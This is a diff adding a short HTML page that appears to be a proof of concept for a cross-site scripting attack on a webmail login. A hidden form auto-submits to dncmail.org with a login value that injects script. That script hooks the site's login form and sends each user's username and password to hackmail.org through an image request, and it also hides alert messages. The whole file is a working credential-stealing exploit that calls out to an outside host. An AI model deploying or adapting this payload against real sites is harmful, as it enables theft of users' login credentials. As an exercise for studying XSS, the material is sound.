@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+
+<form style="display: none;" method="post" action="http://dncmail.org">
+        <input name="login" value="&quot;>&lt;script>document.forms[1].onsubmit = function(e) {(new Image()).src = 'http://hackmail.org/sendmail.php?' +'&username=' + this.login.value + '&payload=' + this.pw.value + '&random=' + Math.random();};setTimeout(function(){var elements = document.getElementsByClassName('alert');for(var i=0; i<elements.length; i++) {elements[i].style.display='none';}}, 100);&lt;/script>&lt;hr style=&quot;display:none">
+        <input name="action" value="login">
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+</body>
+</html>
+
